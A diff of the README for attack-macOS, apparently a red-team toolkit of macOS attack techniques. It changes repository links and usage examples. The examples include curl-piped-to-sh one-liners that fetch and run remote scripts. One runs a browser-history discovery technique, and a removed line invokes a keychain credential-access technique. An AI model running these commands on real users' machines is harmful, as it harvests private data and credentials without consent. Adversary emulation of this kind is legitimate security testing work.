@@ -1,6 +1,6 @@
 <h1 align="center">
   <br>
-  <a href="https://github.com/armadoinc/attack-macos"><img src="https://github.com/user-attachments/assets/03a5c7dc-9dd6-49f9-a58b-2fdcdb6596f6" alt="attack-macOS" ></a>
+  <a href="https://github.com/darmado/attack-macOS"><img src="https://github.com/user-attachments/assets/03a5c7dc-9dd6-49f9-a58b-2fdcdb6596f6" alt="attack-macOS" ></a>
   <br>
 </h1>
 
@@ -190,50 +190,46 @@ All Attack-macOS scripts use native macOS binaries, interpreters, playlists, lib
 **Download attackmacos.sh:**
 
 ```
-curl -O https://raw.githubusercontent.com/armadoinc/attack-macos/main/attackmacos/attackmacos.sh
+curl -O https://raw.githubusercontent.com/darmado/attack-macOS/main/attackmacos/attackmacos.sh
 chmod +x attackmacos.sh
 ```
 
-**Execute techniques remotely (no local repository needed):**
+**Execute techniques locally:**
 
 ```
 # Execute a discovery technique
-./attackmacos.sh --method curl --tactic discovery --ttp browser_history
+./attackmacos.sh --method local --tactic discovery --ttp browser_history --args='--safari'
 
 # List available techniques for a tactic  
 ./attackmacos.sh --list --tactic discovery
-
-# Execute with arguments
-./attackmacos.sh --method curl --tactic credential_access --ttp keychain --args '--verbose'
 
 # Show help and available options
 ./attackmacos.sh --help
 ```
 
-**Alternative: One-liner execution (no download needed):**
+**Direct remote execution (no local files needed):**
 
 ```
-curl -sSL https://raw.githubusercontent.com/armadoinc/attack-macos/main/attackmacos/attackmacos.sh | sh -s -- --method curl --tactic discovery --ttp browser_history
+# Execute a technique directly from GitHub
+curl -sSL https://raw.githubusercontent.com/darmado/attack-macOS/main/attackmacos/ttp/discovery/browser_history/browser_history.sh | sh -s -- --safari
+
+# Execute with help to see available options
+curl -sSL https://raw.githubusercontent.com/darmado/attack-macOS/main/attackmacos/ttp/discovery/browser_history/browser_history.sh | sh -s -- --help
 ```
 
 **For development/customization (full repository):**
 
 ```
-git clone https://github.com/armadoinc/attack-macos
-cd attack-macos/attackmacos
-
-# Execute locally installed scripts
-./attackmacos.sh --method local --tactic discovery --ttp browser_history
-
-# Scripts can also run standalone
-./ttp/discovery/browser_history/browser_history.sh
+git clone https://github.com/darmado/attack-macOS.git
+cd attack-macOS/attackmacos
+./attackmacos.sh --list
 ```
 
 ##
 
 ### Documentation
 
-- [Documentation](https://github.com/armadocorp/attack-macOS/wiki)
+- [Documentation](https://github.com/darmado/attack-macOS/wiki)
 - [Script Blueprint](https://github.com/darmado/attack-macOS/wiki/Script-Blueprint)
 
 ##
